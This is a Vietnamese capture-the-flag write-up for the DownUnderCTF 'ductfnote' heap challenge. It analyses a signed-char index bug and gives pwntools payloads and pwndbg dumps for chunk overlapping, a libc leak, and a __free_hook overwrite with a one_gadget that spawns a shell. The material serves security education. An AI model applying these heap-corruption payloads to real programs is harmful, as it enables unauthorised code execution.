# Phân tích file

```c
ductfnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=81d0e56c3531ad38e1d25d7589dc0362af205e2b, for GNU/Linux 3.2.0, not stripped
```

```c
		Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# Reverse file.

Bài này tác giả cho mình source nên đỡ phải đọc ida.

- Ta có hàm main như sau:
    
    ```c
    int main() {
    	init();
    	welcome();
    
    	int choice;
    	datanote_t* note = NULL;
    	param_t*  params = (param_t*)malloc(sizeof(param_t));
    	params->maxsize = 0x7f;
    
    	while(1) {
    		print_menu();
    
    		scanf("%d", &choice);
    		getchar();
    		printf("\n");
    		switch (choice) {
    			case 1:
    				printf("Size: ");
    				unsigned int size;
    				scanf("%d", &size);
    				getchar();
    				note = create_note(size, params);
    				break;
    			case 2:
    				show_note(note);
    				break;
    			case 3:
    				edit_note(note);
    				break;
    			case 4:
    				free(note);
    				note = 0;
    				break;
    			default:
    				printf("Invalid option.\n");
    		}
    	}
    
    	return 0;
    }
    ```
    
    - Chương trình sẽ malloc cho ta 1 chunk params để chưa maxsize là 0x7f.
- Bài có 4 chức năng chính:

```c
1. Create Note
2. Show Note
3. Edit Note
4. Delete Note
>>
```

- Create Note:
    
    ```c
    datanote_t * create_note(unsigned int size, param_t *params) {
    	if (size > params->maxsize) {
    		printf("Note too big.\n");
    		return 0;
    	}
    	int allocsize = size | 0x80;
    	datanote_t * note = (datanote_t*)malloc(allocsize + 8);
    	note->size = size;
    	return note;
    }
    ```
    
    - Bài chỉ cho ta malloc size < params->maxsize (0x7f)
    
    ```c
    param_t*  params = (param_t*)malloc(sizeof(param_t));
    params->maxsize = 0x7f;
    ```
    
    - Nếu thỏa mãn thì sẽ malloc 1 chunk có size(input_size | 0x80 +8) sau đó dùng 4 byte đầu tiên chứa size
- Show Note:
    
    ```c
    void show_note(datanote_t * note) {
    	if(!note) {
    		printf("No Note.\n");
    		return;
    	}
    
    	printf("<------------ NOTE 1 ------------>\n");
    	fwrite(&(note->data), note->size, 1, stdout);
    	printf("\n");
    	printf("<-------------------------------->\n");
    	printf("\n");
    }
    ```
    
    - Chỉ show ra chunk cuối khi ta malloc.
- Edit Note:
    
    ```c
    void edit_note(datanote_t * note) {
    	if(!note) {
    		printf("No Note.\n");
    		return;
    	}
    
    	signed char idx = 0;
    	while(idx <= note->size) {
    		*(&(note->data)+idx) = fgetc(stdin);
    		if (*(&(note->data)+idx) == '\n') {*(&(note->data)+idx) = '\0'; break;}
    		idx++;
    	}
    }
    ```
    
    - Ở hàm này ta chú ý nó khai báo index kiểu signed char mà kiểu signed char có range(-127,127) nên ở đây ta có thể làm cho index âm và sau đó ghi được giá trị vào các vùng nhớ nhỏ hơn.
    - Ta thấy 0x7f(127) sẽ là số lớn nhất nên khi ta malloc 1 chunk với size_input = 0x7f thì ta có thể edit nhiều hơn 127 byte và có số  âm.
- Delete Note:
    
    ```c
    free(note);
    note = 0;
    ```
    
    - Free rồi set null nên sẽ không có UAF.
    

# Exploit

## Leak libc.

- Do có bug số âm ở hàm edit nên ta có thể dùng nó để edit maxsize ở chunk params để mình có thể malloc 1 size bất kì.
- Giờ ta đã có thể malloc 1 size bất kì, có thể edit size của chunk trên thông qua hàm edit vậy thì ta sẽ overlapping chunk để free 1 chunk vào unsorted bin và leak libc. Nhưng ở đây chương trình chỉ cho ta sử dụng 1 chunk nên phải xử lý sao cho:
    
    ```c
    chunk 1(overlap)
    	chunk 2(overlapped by 1)
    chunk 3(prevent consolidate with topchunk)
    top chunk.
    ```
    
    - Ta sẽ edit size chunk 1 bao gồm chunk 2 và nằm trong size của unsorted bin rồi sau đó free chunk 1 ⇒ được đưa vào unsorted bin ⇒ leak libc.

```python
create(0x7f)
payload = "\x00"*212
payload += p64(0x21)
payload += p64(0xffffffffffffffff)
payload += p64(0)*2
payload += p64(0x190)

edit(payload)
```

- Edit maxsize thành 1 số lớn để ta có thể thoải mái hơn rồi sau đó edit size của chunk vừa malloc thành 0x190.

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x555555559290
Size: 0x21

Allocated chunk
Addr: 0x5555555592b0
Size: 0x190

Allocated chunk
Addr: 0x555555559440
Size: 0x00

pwndbg> x/20xg 0x5555555592b0-0x20
0x555555559290: 0x0000000000000000      0x0000000000000021
0x5555555592a0: 0xffffffffffffffff      0x0000000000000000   <- edit maxsize
0x5555555592b0: 0x0000000000000000      0x0000000000000190   <- edit size
0x5555555592c0: 0x0000000000000000      0x0000000000000000
0x5555555592d0: 0x0000000000000000      0x0000000000000000
0x5555555592e0: 0x0000000000000000      0x0000000000000000
0x5555555592f0: 0x0000000000000000      0x0000000000000000

```

- Tiếp đến delete chunk trên đưa nó vào tcache bin 0x390
    
    ```python
    pwndbg> bin
    tcachebins
    0x190 [  1]: 0x5555555592c0 ◂— 0x0
    ```
    
- Tạo 3 chunk như sau:
    
    ```python
    create(0x7f)
    delete()
    
    create(0x3e0) #overlapping with chunk 0x7f
    create(0x200) #prevent consolidate topchunk
    create(0x7f) #1
    payload = "\x00"*212
    payload += p64(0x21)
    payload += p64(0xffffffffffffffff)
    payload += p64(0x0)*2
    payload += p64(0x501)
    edit(payload)
    delete()
    ```
    
    - Lúc đầu ta sẽ create 1 chunk với size 0x7f rồi free lúc này trong bin sẽ như sau:
        
        ```python
        pwndbg> bin
        tcachebins
        0x110 [  1]: 0x5555555593d0 ◂— 0x0
        0x190 [  1]: 0x5555555592c0 ◂— 0x0
        ```
        
    - Tiếp đến create 1 chunk với size 0x3e0 để overlap với chunk 0x7f ở trên.
    - Create 0x200 để chặn consolidate với top chunk
    - Create lại size 0x7f thì sẽ sử dụng bin trong tcache và lúc này chunk này vẫn nằm trước chunk 0x3e0 và ta edit size chunk này thành 0x501 để overlap chunk 0x3e0.
        
        ```python
        0x5555555593c0: 0x0000000000000000      0x0000000000000501   <- overwrite size
        0x5555555593d0: 0x0000000000000000      0x0000000000000000
        0x5555555593e0: 0x0000000000000000      0x0000000000000000
        0x5555555593f0: 0x0000000000000000      0x0000000000000000
        0x555555559400: 0x0000000000000000      0x0000000000000000
        0x555555559410: 0x0000000000000000      0x0000000000000000
        0x555555559420: 0x0000000000000000      0x0000000000000000
        0x555555559430: 0x0000000000000000      0x0000000000000000
        0x555555559440: 0x0000000000000000      0x0000000000000000
        0x555555559450: 0x0000000000000000      0x0000000000000000
        0x555555559460: 0x0000000000000000      0x0000000000000000
        0x555555559470: 0x0000000000000000      0x0000000000000000
        0x555555559480: 0x0000000000000000      0x0000000000000000
        0x555555559490: 0x0000000000000000      0x0000000000000000
        0x5555555594a0: 0x0000000000000000      0x0000000000000000
        0x5555555594b0: 0x0000000000000000      0x0000000000000000
        0x5555555594c0: 0x0000000000000000      0x0000000000000000
        0x5555555594d0: 0x0000000000000000      0x00000000000003f1   <- chunk overlapped
        0x5555555594e0: 0x00000000000003e0      0x0000000000000000
        0x5555555594f0: 0x0000000000000000      0x0000000000000000
        0x555555559500: 0x0000000000000000      0x0000000000000000
        0x555555559510: 0x0000000000000000      0x0000000000000000
        0x555555559520: 0x0000000000000000      0x0000000000000000
        0x555555559530: 0x0000000000000000      0x0000000000000000
        0x555555559540: 0x0000000000000000      0x0000000000000000
        0x555555559550: 0x0000000000000000      0x0000000000000000
        0x555555559560: 0x0000000000000000      0x0000000000000000
        0x555555559570: 0x0000000000000000      0x0000000000000000
        0x555555559580: 0x0000000000000000      0x0000000000000000
        0x555555559590: 0x0000000000000000      0x0000000000000000
        0x5555555595a0: 0x0000000000000000      0x0000000000000000
        0x5555555595b0: 0x0000000000000000      0x0000000000000000
        0x5555555595c0: 0x0000000000000000      0x0000000000000000
        0x5555555595d0: 0x0000000000000000      0x0000000000000000
        0x5555555595e0: 0x0000000000000000      0x0000000000000000
        0x5555555595f0: 0x0000000000000000      0x0000000000000000
        0x555555559600: 0x0000000000000000      0x0000000000000000
        0x555555559610: 0x0000000000000000      0x0000000000000000
        0x555555559620: 0x0000000000000000      0x0000000000000000
        0x555555559630: 0x0000000000000000      0x0000000000000000
        0x555555559640: 0x0000000000000000      0x0000000000000000
        0x555555559650: 0x0000000000000000      0x0000000000000000
        0x555555559660: 0x0000000000000000      0x0000000000000000
        0x555555559670: 0x0000000000000000      0x0000000000000000
        0x555555559680: 0x0000000000000000      0x0000000000000000
        0x555555559690: 0x0000000000000000      0x0000000000000000
        0x5555555596a0: 0x0000000000000000      0x0000000000000000
        0x5555555596b0: 0x0000000000000000      0x0000000000000000
        0x5555555596c0: 0x0000000000000000      0x0000000000000000
        0x5555555596d0: 0x0000000000000000      0x0000000000000000
        0x5555555596e0: 0x0000000000000000      0x0000000000000000
        0x5555555596f0: 0x0000000000000000      0x0000000000000000
        0x555555559700: 0x0000000000000000      0x0000000000000000
        0x555555559710: 0x0000000000000000      0x0000000000000000
        0x555555559720: 0x0000000000000000      0x0000000000000000
        0x555555559730: 0x0000000000000000      0x0000000000000000
        0x555555559740: 0x0000000000000000      0x0000000000000000
        0x555555559750: 0x0000000000000000      0x0000000000000000
        0x555555559760: 0x0000000000000000      0x0000000000000000
        0x555555559770: 0x0000000000000000      0x0000000000000000
        0x555555559780: 0x0000000000000000      0x0000000000000000
        0x555555559790: 0x0000000000000000      0x0000000000000000
        0x5555555597a0: 0x0000000000000000      0x0000000000000000
        0x5555555597b0: 0x0000000000000000      0x0000000000000000
        0x5555555597c0: 0x0000000000000000      0x0000000000000000
        0x5555555597d0: 0x0000000000000000      0x0000000000000000
        0x5555555597e0: 0x0000000000000000      0x0000000000000000
        0x5555555597f0: 0x0000000000000000      0x0000000000000000
        0x555555559800: 0x0000000000000000      0x0000000000000000
        0x555555559810: 0x0000000000000000      0x0000000000000000
        0x555555559820: 0x0000000000000000      0x0000000000000000
        0x555555559830: 0x0000000000000000      0x0000000000000000
        0x555555559840: 0x0000000000000000      0x0000000000000000
        0x555555559850: 0x0000000000000000      0x0000000000000000
        0x555555559860: 0x0000000000000000      0x0000000000000000
        0x555555559870: 0x0000000000000000      0x0000000000000000
        0x555555559880: 0x0000000000000000      0x0000000000000000
        0x555555559890: 0x0000000000000000      0x0000000000000000
        0x5555555598a0: 0x0000000000000000      0x0000000000000000
        0x5555555598b0: 0x0000000000000000      0x0000000000000000
        0x5555555598c0: 0x0000000000000000      0x0000000000000291    <- prevent consolidate
        0x5555555598d0: 0x0000000000000200      0x0000000000000000
        pwndbg> p/x 0x5555555598c0-0x5555555593c0
        $18 = 0x500 #size de overlap
        ```
        
        - Tiếp đến free thì sẽ được đưa vào unsorted bin
            
            ```python
            pwndbg> bin
            tcachebins
            0x190 [  1]: 0x5555555592c0 ◂— 0x0
            fastbins
            0x20: 0x0
            0x30: 0x0
            0x40: 0x0
            0x50: 0x0
            0x60: 0x0
            0x70: 0x0
            0x80: 0x0
            unsortedbin
            all: 0x5555555593c0 —▸ 0x7ffff7fb2be0 (main_arena+96) ◂— 0x5555555593c0
            ```
            
        - Giờ ta chỉ cần create 1 chunk rồi show ra sẽ leak được libc.
            
            ```python
            create(0x100)
            payload = "\x00"*212
            payload += p64(0x21)
            payload += p64(0xffffffffffffffff)
            payload += p64(0x0)*2
            payload += p64(0x211) 
            payload += p32(0x27f)	
            edit(payload)
            
            show()
            ```
            
            - Ở đây ta overwrite size = 0x211 để setup cho phần sau.
                
                ```python
                pwndbg> x/40xg 0x5555555592c0-0x10
                0x5555555592b0: 0x0000000000000000      0x0000000000000211
                0x5555555592c0: 0x0000000000000210      0x0000000000000000
                0x5555555592d0: 0x0000000000000000      0x0000000000000000
                0x5555555592e0: 0x0000000000000000      0x0000000000000000
                0x5555555592f0: 0x0000000000000000      0x0000000000000000
                0x555555559300: 0x0000000000000000      0x0000000000000000
                0x555555559310: 0x0000000000000000      0x0000000000000000
                0x555555559320: 0x0000000000000000      0x0000000000000000
                0x555555559330: 0x0000000000000000      0x0000000000000000
                0x555555559340: 0x0000000000000000      0x0000000000000000
                0x555555559350: 0x0000000000000000      0x0000000000000000
                0x555555559360: 0x0000000000000000      0x0000000000000000
                0x555555559370: 0x0000000000000000      0x0000000000000000
                0x555555559380: 0x0000000000000000      0x0000000000000000
                0x555555559390: 0x0000000000000000      0x0000000000000000
                0x5555555593a0: 0x0000000000000000      0x0000000000000021
                0x5555555593b0: 0xffffffffffffffff      0x0000000000000000
                0x5555555593c0: 0x0000000000000000      0x0000000000000501
                0x5555555593d0: 0x00007ffff7fb2be0      0x00007ffff7fb2be0
                0x5555555593e0: 0x0000000000000000      0x0000000000000000
                
                [*] leak: 0x7ffff7fb2be0
                [*] base: 0x7ffff7dc7000
                ```
                
            - Sau đó delete để đưa chunk đó vào bin 0x210 sử dụng cho overwrite __free_hook.
                
                ```python
                pwndbg> bin
                tcachebins
                0x210 [  1]: 0x5555555592c0 ◂— 0x0
                ```
                
        
        ## Overwrite __free_hook
        
        - Ta thấy chương trình có 1 chunk để quản lý địa các chunk đã được free
            
            ```python
            pwndbg> heap
            Allocated chunk | PREV_INUSE
            Addr: 0x555555559000
            Size: 0x291
            
            pwndbg> x/60xg 0x555555559000
            0x555555559000: 0x0000000000000000      0x0000000000000291
            0x555555559010: 0x0000000000000000      0x0000000000000000
            0x555555559020: 0x0000000000000000      0x0000000000000000
            0x555555559030: 0x0000000000000000      0x0000000000000000
            0x555555559040: 0x0000000000000000      0x0001000000000000
            0x555555559050: 0x0000000000000000      0x0000000000000000
            0x555555559060: 0x0000000000000000      0x0000000000000000
            0x555555559070: 0x0000000000000000      0x0000000000000000
            0x555555559080: 0x0000000000000000      0x0000000000000000
            0x555555559090: 0x0000000000000000      0x0000000000000000
            0x5555555590a0: 0x0000000000000000      0x0000000000000000
            0x5555555590b0: 0x0000000000000000      0x0000000000000000
            0x5555555590c0: 0x0000000000000000      0x0000000000000000
            0x5555555590d0: 0x0000000000000000      0x0000000000000000
            0x5555555590e0: 0x0000000000000000      0x0000000000000000
            0x5555555590f0: 0x0000000000000000      0x0000000000000000
            0x555555559100: 0x0000000000000000      0x0000000000000000
            0x555555559110: 0x0000000000000000      0x0000000000000000
            0x555555559120: 0x0000000000000000      0x0000000000000000
            0x555555559130: 0x0000000000000000      0x0000000000000000
            0x555555559140: 0x0000000000000000      0x0000000000000000
            0x555555559150: 0x0000000000000000      0x0000000000000000
            0x555555559160: 0x0000000000000000      0x0000000000000000
            0x555555559170: 0x0000000000000000      0x0000000000000000
            0x555555559180: 0x0000000000000000      0x00005555555592c0   <- addr freed chunk
            0x555555559190: 0x0000000000000000      0x0000000000000000
            0x5555555591a0: 0x0000000000000000      0x0000000000000000
            0x5555555591b0: 0x0000000000000000      0x0000000000000000
            0x5555555591c0: 0x0000000000000000      0x0000000000000000
            0x5555555591d0: 0x0000000000000000      0x0000000000000000
            ```
            
            - Ta thấy địa chỉ của chunk vừa free nằm ở đây nếu ta malloc 1 size phù hợp thì địa chỉ này sẽ được sử dụng để malloc, vậy ý tưởng của ta là sẽ overwrite địa chỉ của free chunk thành __free_hook thì lần malloc sau với size đó ta sẽ malloc được vùng nhớ của __free_hook và ghi one_gadget vào.
            - Ta sẽ malloc 1 chunk rồi free nó
                
                ```python
                create(0x300)
                delete()
                
                pwndbg> x/80xg 0x555555559000
                0x555555559000: 0x0000000000000000      0x0000000000000291
                0x555555559010: 0x0000000000000000      0x0000000000000000
                0x555555559020: 0x0000000000000000      0x0000000000000000
                0x555555559030: 0x0000000000000000      0x0000000000000000
                0x555555559040: 0x0000000000000000      0x0001000000000000
                0x555555559050: 0x0000000000000000      0x0000000000000000
                0x555555559060: 0x0000000000000000      0x0000000000000000
                0x555555559070: 0x0000000000000000      0x0001000000000000
                0x555555559080: 0x0000000000000000      0x0000000000000000
                0x555555559090: 0x0000000000000000      0x0000000000000000
                0x5555555590a0: 0x0000000000000000      0x0000000000000000
                0x5555555590b0: 0x0000000000000000      0x0000000000000000
                0x5555555590c0: 0x0000000000000000      0x0000000000000000
                0x5555555590d0: 0x0000000000000000      0x0000000000000000
                0x5555555590e0: 0x0000000000000000      0x0000000000000000
                0x5555555590f0: 0x0000000000000000      0x0000000000000000
                0x555555559100: 0x0000000000000000      0x0000000000000000
                0x555555559110: 0x0000000000000000      0x0000000000000000
                0x555555559120: 0x0000000000000000      0x0000000000000000
                0x555555559130: 0x0000000000000000      0x0000000000000000
                0x555555559140: 0x0000000000000000      0x0000000000000000
                0x555555559150: 0x0000000000000000      0x0000000000000000
                0x555555559160: 0x0000000000000000      0x0000000000000000
                0x555555559170: 0x0000000000000000      0x0000000000000000
                0x555555559180: 0x0000000000000000      0x00005555555592c0
                0x555555559190: 0x0000000000000000      0x0000000000000000
                0x5555555591a0: 0x0000000000000000      0x0000000000000000
                0x5555555591b0: 0x0000000000000000      0x0000000000000000
                0x5555555591c0: 0x0000000000000000      0x0000000000000000
                0x5555555591d0: 0x0000000000000000      0x0000000000000000
                0x5555555591e0: 0x0000000000000000      0x0000000000000000
                0x5555555591f0: 0x0000000000000000      0x0000000000000000
                0x555555559200: 0x0000000000000000      0x0000000000000000
                0x555555559210: 0x0000000000000000      0x0000000000000000
                0x555555559220: 0x0000000000000000      0x0000000000000000
                0x555555559230: 0x0000000000000000      0x0000000000000000
                0x555555559240: 0x0000000000000000      0x00005555555593d0    <- addr free chunk
                0x555555559250: 0x0000000000000000      0x0000000000000000
                0x555555559260: 0x0000000000000000      0x0000000000000000
                0x555555559270: 0x0000000000000000      0x0000000000000000
                ```
                
            - Giờ ta sẽ malloc lại 1 size 0x210 để edit overwrite địa chỉ trên và đây là lí do mình nói ở phần leak libc vì chunk này gần với chunk đã được free nên ta có thể overwrite được.
                
                ```python
                pwndbg> bin
                tcachebins
                0x210 [  1]: 0x5555555592c0 ◂— 0x0
                0x390 [  1]: 0x5555555593d0 ◂— 0x0
                ```
                
            - Giờ malloc (0x1f7 | 0x80 +8) và overwrite địa chỉ trên.
                
                ```python
                create(0x17f) 
                payload = "a"*0x80 
                payload += "\x00"*0x4
                payload += p64(free_hook-0x8)
                edit(payload)
                
                pwndbg> x/80xg 0x555555559000
                0x555555559000: 0x0000000000000000      0x0000000000000291
                0x555555559010: 0x0000000000000000      0x0000000000000000
                0x555555559020: 0x0000000000000000      0x0000000000000000
                0x555555559030: 0x0000000000000000      0x0000000000000000
                0x555555559040: 0x0000000000000000      0x0000000000000000
                0x555555559050: 0x0000000000000000      0x0000000000000000
                0x555555559060: 0x0000000000000000      0x0000000000000000
                0x555555559070: 0x0000000000000000      0x0001000000000000
                0x555555559080: 0x0000000000000000      0x0000000000000000
                0x555555559090: 0x0000000000000000      0x0000000000000000
                0x5555555590a0: 0x0000000000000000      0x0000000000000000
                0x5555555590b0: 0x0000000000000000      0x0000000000000000
                0x5555555590c0: 0x0000000000000000      0x0000000000000000
                0x5555555590d0: 0x0000000000000000      0x0000000000000000
                0x5555555590e0: 0x0000000000000000      0x0000000000000000
                0x5555555590f0: 0x0000000000000000      0x0000000000000000
                0x555555559100: 0x0000000000000000      0x0000000000000000
                0x555555559110: 0x0000000000000000      0x0000000000000000
                0x555555559120: 0x0000000000000000      0x0000000000000000
                0x555555559130: 0x0000000000000000      0x0000000000000000
                0x555555559140: 0x0000000000000000      0x0000000000000000
                0x555555559150: 0x0000000000000000      0x0000000000000000
                0x555555559160: 0x0000000000000000      0x0000000000000000
                0x555555559170: 0x0000000000000000      0x0000000000000000
                0x555555559180: 0x0000000000000000      0x0000000000000000   <- addr 0x210 [  1]: 0x5555555592c0 ◂— 0x0 is used
                0x555555559190: 0x0000000000000000      0x0000000000000000
                0x5555555591a0: 0x0000000000000000      0x0000000000000000
                0x5555555591b0: 0x0000000000000000      0x0000000000000000
                0x5555555591c0: 0x0000000000000000      0x0000000000000000
                0x5555555591d0: 0x0000000000000000      0x0000000000000000
                0x5555555591e0: 0x0000000000000000      0x0000000000000000
                0x5555555591f0: 0x0000000000000000      0x0000000000000000
                0x555555559200: 0x0000000000000000      0x0000000000000000
                0x555555559210: 0x0000000000000000      0x0000000000000000
                0x555555559220: 0x0000000000000000      0x0000000000000000
                0x555555559230: 0x0000000000000000      0x0000000000000000
                0x555555559240: 0x0000000000000000      0x00007ffff7fb5b20   <- overwrite with __free_hook-8
                0x555555559250: 0x0000000000000000      0x0000000000000000
                0x555555559260: 0x0000000000000000      0x0000000000000000
                0x555555559270: 0x0000000000000000      0x0000000000000000
                ```
                
            - Lí do phải về __free_hook-8 là vì khi malloc 1 chunk 4 bytes đầu được dùng để chứa size.
            - Malloc lại với size như trên ⇒ malloc vùng __free_hook-8.
                
                ```python
                *RAX  0x7ffff7fb5b20 (__after_morecore_hook) ◂— 0x0    <- sau khi call malloc
                 RBX  0x555555555720 (__libc_csu_init) ◂— endbr64
                *RCX  0x55555555907e ◂— 0x0
                *RDX  0x0
                 RDI  0x388
                *RSI  0x0
                *R8   0x7ffff7fb5b20 (__after_morecore_hook) ◂— 0x0
                 R9   0x0
                 R10  0x7ffff7f65ac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
                 R11  0x0
                 R12  0x555555555180 (_start) ◂— endbr64
                 R13  0x7fffffffe130 ◂— 0x1
                 R14  0x0
                 R15  0x0
                 RBP  0x7fffffffe010 —▸ 0x7fffffffe040 ◂— 0x0
                 RSP  0x7fffffffdff0 —▸ 0x5555555592a0 ◂— 0xffffffffffffffff
                *RIP  0x5555555555fa (create_note+75) ◂— mov    qword ptr [rbp - 8], rax
                ───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────
                   0x5555555555f5 <create_note+70>    call   malloc@plt <malloc@plt>
                 ► 0x5555555555fa <create_note+75>    mov    qword ptr [rbp - 8], rax <0x7ffff7fb5b20>
                
                ```
                
                ```python
                create(0x300) 
                payload = 'a'*4 
                payload += p64(one_gadget)
                edit(payload)
                ```
                
                ```python
                pwndbg> x/2xg 0x7ffff7fb5b20
                0x7ffff7fb5b20 <__after_morecore_hook>: 0x6161616100000300      0x00007ffff7eadc81
                pwndbg> x/xg &__free_hook
                0x7ffff7fb5b28 <__free_hook>:   0x00007ffff7eadc81
                ```
                
            - Cuối cùng ta chỉ cần free() là lên được shell.
            
            ```python
            [+] Opening connection to pwn-2021.duc.tf on port 31917: Done
            [*] '/mnt/c/Users/ADMIN/Desktop/underCTF/note/ductfnote'
                Arch:     amd64-64-little
                RELRO:    Full RELRO
                Stack:    No canary found
                NX:       NX enabled
                PIE:      PIE enabled
            [*] '/mnt/c/Users/ADMIN/Desktop/underCTF/note/libc-2.31.so'
                Arch:     amd64-64-little
                RELRO:    Partial RELRO
                Stack:    Canary found
                NX:       NX enabled
                PIE:      PIE enabled
            [*] leak: 0x7fd4e29eebe0
            [*] Base: 0x7fd4e2803000
            [*] One_gadget: 0x7fd4e28e9c81
            [*] Switching to interactive mode
            
            $ cat flag.txt
            DUCTF{n0w_you_4r3_r34dy_f0r_r34l_m$_0d4y}
            $
            ```
